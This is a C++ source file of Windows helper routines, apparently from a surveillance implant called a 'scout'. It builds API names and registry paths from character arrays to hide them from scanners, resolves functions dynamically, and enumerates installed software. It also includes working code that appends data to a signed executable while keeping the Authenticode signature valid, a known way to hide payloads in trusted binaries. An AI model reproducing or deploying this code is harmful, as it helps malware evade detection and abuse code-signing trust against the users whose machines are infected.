#include <Windows.h>
#include "utils.h"
#include "proto.h"
#include "zmem.h"


BOOL ExecQueryGetProp(IWbemServices *pSvc, LPWSTR strQuery, LPWSTR strField,  LPVARIANT lpVar)
{
	BOOL bRet = FALSE;
	IEnumWbemClassObject *pEnum;
	
	BSTR bstrQuery = SysAllocString(strQuery);
	BSTR bstrField = SysAllocString(strField);
	
	WCHAR strWQL[] = { L'W', L'Q', L'L', L'\0' };
	BSTR bWQL = SysAllocString(strWQL);

	HRESULT hr = pSvc->ExecQuery(bWQL, bstrQuery, 0, NULL, &pEnum);
	if (hr == S_OK)
	{
		ULONG uRet;
		IWbemClassObject *apObj;
		hr = pEnum->Next(5000, 1, &apObj, &uRet);
		if (hr == S_OK)
		{
			hr = apObj->Get(bstrField, 0, lpVar, NULL, NULL);
			if (hr == WBEM_S_NO_ERROR)
				bRet = TRUE;

			apObj->Release();
		}
		pEnum->Release();
	}

	SysFreeString(bstrQuery);
	SysFreeString(bstrField);
	SysFreeString(bWQL);
	
	return bRet;
}

BOOL ExecQuerySearchEntryHash(IWbemServices *pSvc, LPWSTR strQuery, LPWSTR strField, LPBYTE pSearchHash, LPVARIANT lpVar)
{
	BOOL bFound = FALSE;
	IEnumWbemClassObject *pEnum;
	WCHAR strWQL[] = { L'W', L'Q', L'L', L'\0' };
	
	BSTR bWQL = SysAllocString(strWQL);
	BSTR bstrQuery = SysAllocString(strQuery);
	BSTR bstrField = SysAllocString(strField);

	HRESULT hr = pSvc->ExecQuery(bWQL, bstrQuery, 0, NULL, &pEnum);
	if (hr == S_OK)
	{
		ULONG uRet;
		IWbemClassObject *apObj;

		while (pEnum->Next(5000, 1, &apObj, &uRet) == S_OK)
		{
			hr = apObj->Get(bstrField, 0, lpVar, NULL, NULL);
			if (hr != WBEM_S_NO_ERROR ||  lpVar->vt != VT_BSTR)
				continue;

			BYTE pSha1Buffer[20];
			CalculateSHA1(pSha1Buffer, (LPBYTE)lpVar->bstrVal, 21*sizeof(WCHAR));
			if (!memcmp(pSha1Buffer, pSearchHash, 20))
				bFound = TRUE;

			apObj->Release();
		}

		pEnum->Release();
	}

	SysFreeString(bstrQuery);
	SysFreeString(bstrField);
	SysFreeString(bWQL);

	return bFound;
}


LPBYTE GetRandomData(__in DWORD dwBuffLen)
{
	LPBYTE lpBuffer = (LPBYTE) malloc(dwBuffLen);
	AppendRandomData(lpBuffer, dwBuffLen);
	return lpBuffer;
}

VOID AppendRandomData(PBYTE pBuffer, DWORD uBuffLen)
{
	DWORD i;
	static BOOL uFirstTime = TRUE;

	if (uFirstTime) {
		srand(GetTickCount());
		uFirstTime = FALSE;
	}

	for (i=0; i<uBuffLen; i++)
		pBuffer[i] = rand();
}

/*	Append data to a signed executable without invalidating its signature.
	N.B. pad data must be 8 byte aligned 

	RETURNS a pointer to a buffer containing a fat signed executable, NULL otherwise
*/
LPBYTE AppendDataInSignedExecutable(LPWSTR lpTargetExecutable, LPBYTE lpPadData, DWORD dwPadDataSize, PDWORD dwFatExecutableSize)
{
	*dwFatExecutableSize = 0;

	/* read target executable content */
	HANDLE hExecutable = CreateFile(lpTargetExecutable, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if( hExecutable == INVALID_HANDLE_VALUE )
		return NULL;

	LPBYTE lpBuffer = AppendDataInSignedExecutable(hExecutable, lpPadData, dwPadDataSize, dwFatExecutableSize);

	CloseHandle(hExecutable);

	return lpBuffer;
}

LPBYTE AppendDataInSignedExecutable(HANDLE hExecutable, LPBYTE lpPadData, DWORD dwPadDataSize, PDWORD dwFatExecutableSize)
{
		
	DWORD dwExecutableSize = 0;
	dwExecutableSize = GetFileSize(hExecutable, NULL);
	LPBYTE lpExecutableBuffer = (LPBYTE) zalloc(dwExecutableSize);

	DWORD dwBytesRead = 0;

	if( !ReadFile(hExecutable, lpExecutableBuffer, dwExecutableSize, &dwBytesRead, NULL) )
	{
#ifdef _DEBUG
		OutputDebugString(L"Can't read file");
#endif
		return NULL;
	}
	
	

	/* optional_header -> data_directory -> image_directory_entry_security */

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) lpExecutableBuffer;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS) (lpExecutableBuffer + pDosHeader->e_lfanew);
	
	DWORD dwSecurityDirectoryRva =  0;
	DWORD dwSecurityDirectorySize =  0;
	
	dwSecurityDirectoryRva  = (DWORD)(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress);  
	dwSecurityDirectorySize = (DWORD)(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size);  

	/* if file is not signed return */
	if( dwSecurityDirectoryRva == 0 )
	{
#ifdef _DEBUG
		OutputDebugString(L"No signature");
#endif
		return NULL;
	}

	/* pad data must be a 8 byte multiple */
	if( dwPadDataSize % 8 != 0 )
	{
#ifdef _DEBUG
		OutputDebugString(L"No pad");
#endif
		return NULL;
	}


	/* create a buffer to host the new executable */
	LPBYTE lpFatExecutableBuffer = (LPBYTE) zalloc(dwExecutableSize + dwPadDataSize);

	/* 
		fat executable creation:
		1] old executable + pad
		2] update security entry size
		3] update pe checksum
	*/

	/* 1] old executable + pad */
	memcpy(lpFatExecutableBuffer, lpExecutableBuffer, dwExecutableSize);
	memcpy(lpFatExecutableBuffer + dwExecutableSize, lpPadData, dwPadDataSize);

	/* 2] update security entry size */
	pNtHeaders = (PIMAGE_NT_HEADERS) (lpFatExecutableBuffer + pDosHeader->e_lfanew);
	LPDWORD lpSecuritySize = &(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size);
	
	*lpSecuritySize = dwSecurityDirectorySize + dwPadDataSize;

	/* 3] update pe checksum */
	LPDWORD lpFatChecksum = &(pNtHeaders->OptionalHeader.CheckSum);
	DWORD dwNewFatChecksum = ComputePEChecksum(lpFatExecutableBuffer, dwExecutableSize + dwPadDataSize);
	
	if( dwNewFatChecksum == -1 )
	{
#ifdef _DEBUG
		OutputDebugString(L"Fail checksum");
#endif
		return NULL;
	}

	*lpFatChecksum = dwNewFatChecksum;


	/* cleanup */
	zfree(lpExecutableBuffer);


	*dwFatExecutableSize = dwExecutableSize + dwPadDataSize;
	return lpFatExecutableBuffer;
}


DWORD ComputePEChecksum(LPBYTE lpMz, DWORD dwBufferSize)
{
	HMODULE hImageHlp = LoadLibrary(L"Imagehlp.dll");
	if( hImageHlp == NULL )
		return -1;

	CHECKSUMMAPPEDFILE fpCheckSumMappedFile = (CHECKSUMMAPPEDFILE) GetProcAddress(hImageHlp, "CheckSumMappedFile");

	if( fpCheckSumMappedFile == NULL )
	{
		FreeLibrary(hImageHlp);
		return -1;
	}

	DWORD dwOriginalChecksum = 0;
	DWORD dwComputedChecksum = 0;
	fpCheckSumMappedFile(lpMz,dwBufferSize, &dwOriginalChecksum, &dwComputedChecksum);

	FreeLibrary(hImageHlp);

	return dwComputedChecksum;
}



PWCHAR GetApplicationList(BOOL bX64View)
{
	ULONG uLen, uIndex, uVal, uAppList;
	HKEY hKeyUninstall, hKeyProgram;
	WCHAR pStringValue[128], pProduct[256];
	PWCHAR pApplicationList = NULL;
	
	uLen = uIndex = 0;
	hKeyUninstall = hKeyProgram = NULL;
	
	ULONG uSamDesidered = KEY_READ;
	if (bX64View)
		uSamDesidered |= KEY_WOW64_64KEY;
	
	WCHAR strAdvapi32[] = { L'A', L'd', L'v', L'a', L'p', L'i', L'3', L'2', L'\0' };
	CHAR strRegOpenKeyExW[] = { 'R', 'e', 'g', 'O', 'p', 'e', 'n', 'K', 'e', 'y', 'E', 'x', 'W', 0x0 };

	typedef LONG (WINAPI *RegOpenKeyEx_p)(_In_ HKEY hKey, _In_opt_ LPWSTR lpSubKey, DWORD ulOptions, _In_ REGSAM samDesired, _Out_ PHKEY phkResult);
	RegOpenKeyEx_p fpRegOpenKeyExW = (RegOpenKeyEx_p) GetProcAddress(LoadLibrary(strAdvapi32), strRegOpenKeyExW);

	WCHAR strKey[] = { L'S', L'O', L'F', L'T', L'W', L'A', L'R', L'E', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', L'C', L'u', L'r', L'r', L'e', L'n', L't', L'V', L'e', L'r', L's', L'i', L'o', L'n', L'\\', L'U', L'n', L'i', L'n', L's', L't', L'a', L'l', L'l', L'\0' };
		
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, strKey, 0, uSamDesidered, &hKeyUninstall) == ERROR_SUCCESS)
	{
		while (1)
		{
			if (hKeyProgram)
			{
				RegCloseKey(hKeyProgram);
				hKeyProgram = NULL;
			}

			uLen = sizeof(pStringValue) / sizeof(WCHAR);
			if (RegEnumKeyEx(hKeyUninstall, uIndex++, pStringValue, &uLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
				break;

 			if (RegOpenKeyEx(hKeyUninstall, pStringValue, 0, uSamDesidered, &hKeyProgram) != ERROR_SUCCESS)
				continue;

			WCHAR strParentKeyName[] = { L'P', L'a', L'r', L'e', L'n', L't', L'K', L'e', L'y', L'N', L'a', L'm', L'e', L'\0' };
			if (RegQueryValueEx(hKeyProgram, strParentKeyName, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
				continue;

			// no windows security essential without this.
			//WCHAR strSystemComponent[] = { L'S', L'y', L's', L't', L'e', L'm', L'C', L'o', L'm', L'p', L'o', L'n', L'e', L'n', L't', L'e', L'\0' };
			WCHAR strSystemComponent[] = { L'S', L'y', L's', L't', L'e', L'm', L'C', L'o', L'm', L'p', L'o', L'n', L'e', L'n', L't', L'\0' };
			uLen = sizeof(ULONG);
			if ((RegQueryValueEx(hKeyProgram, strSystemComponent, NULL, NULL, (PBYTE)&uVal, &uLen) == ERROR_SUCCESS) && (uVal == 1))
				continue;

			WCHAR strDisplayName[] = { L'D', L'i', L's', L'p', L'l', L'a', L'y', L'N', L'a', L'm', L'e', L'\0' };
			uLen = sizeof(pStringValue);
			if (RegQueryValueEx(hKeyProgram, strDisplayName, NULL, NULL, (PBYTE)pStringValue, &uLen) != ERROR_SUCCESS)
				continue;

			wcsncpy_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), pStringValue, _TRUNCATE);

			WCHAR strDisplayVersion[] = { L'D', L'i', L's', L'p', L'l', L'a', L'y', L'V', L'e', L'r', L's', L'i', L'o', 'n', L'\0' };
			uLen = sizeof(pStringValue);
			if (!RegQueryValueEx(hKeyProgram, strDisplayVersion, NULL, NULL, (PBYTE)pStringValue, &uLen))
			{
				wcsncat_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), L"   (", _TRUNCATE);
				wcsncat_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), pStringValue, _TRUNCATE);
				wcsncat_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), L")", _TRUNCATE);
			}
			wcsncat_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), L"\n", _TRUNCATE);

			if (!pApplicationList)
			{
 				uAppList = wcslen(pProduct) * sizeof(WCHAR) + sizeof(WCHAR);
				pApplicationList = (PWCHAR)realloc(NULL,  uAppList);
				memset(pApplicationList, 0x0, uAppList);
			}
			else
			{
				uAppList = wcslen(pApplicationList)*sizeof(WCHAR) + wcslen(pProduct)*sizeof(WCHAR) + sizeof(WCHAR);
				pApplicationList = (PWCHAR)realloc(pApplicationList, uAppList);
			}
			wcsncat_s(pApplicationList, uAppList / sizeof(WCHAR), pProduct, wcslen(pProduct));
		}
	}
		
	return pApplicationList;
}

VOID IsX64System(PBOOL bIsWow64, PBOOL bIsx64OS)
{   
    //SYSTEM_INFO SysInfo;
	
	CHAR strIsWow64Process[] = { 'I', 's', 'W', 'o', 'w', '6', '4', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
	//CHAR strGetNativeSystemInfo[] = { 'G', 'e', 't', 'N', 'a', 't', 'i', 'v', 'e', 'S', 'y', 's', 't', 'e', 'm', 'I', 'n', 'f', 'o', 0x0 };
	WCHAR strKernel32[] = { L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'\0' };
		
	typedef VOID (WINAPI *IsWow64Process_p)(HANDLE, PBOOL);	
	IsWow64Process_p fpIsWow64Process = (IsWow64Process_p) GetProcAddress(LoadLibrary(strKernel32), strIsWow64Process);
	fpIsWow64Process((HANDLE)-1, bIsWow64);
	
	*bIsx64OS = *bIsWow64; // lo scout e' a 32, quindi se e' wow64 siamo su x64
	
	/*
	IsWow64Process(GetCurrentProcess(), &bIsx64OS);
	typedef VOID (WINAPI *GetNativeSystemInfo_p)(LPSYSTEM_INFO);
	GetNativeSystemInfo_p fpGetNativeSystemInfo = (GetNativeSystemInfo_p) GetProcAddress(LoadLibrary(strKernel32), strGetNativeSystemInfo);
	fpGetNativeSystemInfo(&SysInfo);
	
	if(SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
		*bIsx64OS = FALSE;
	else
		*bIsx64OS = TRUE;
	*/
	return;
}

//set the attributes of a file
BOOL SetFileAttrib(LPCWSTR lpwsFileName, DWORD dwFileAttributes)
{
	DWORD dwRet;

    dwRet = GetFileAttributes(lpwsFileName); 
    if(dwRet == INVALID_FILE_ATTRIBUTES)
		return FALSE;

	return SetFileAttributes(lpwsFileName, dwRet | dwFileAttributes);     
}


//check if the read-only flag is set and eventually unset it
BOOL CheckFileAttribs(LPWSTR lpwsFileName)
{
	DWORD dwRet;

	//get the file attributes
	dwRet = GetFileAttributes(lpwsFileName);
	if(dwRet == INVALID_FILE_ATTRIBUTES)
		return TRUE;

	if(!(dwRet & FILE_ATTRIBUTE_READONLY))
		return TRUE;

	#ifdef _DEBUG		
		OutputDebugString(L"The file is read-only\r\n");
		OutputDebugString(lpwsFileName);
		OutputDebugString(L"\r\n");
	#endif

	return SetFileAttributes(lpwsFileName, dwRet & (~FILE_ATTRIBUTE_READONLY));
}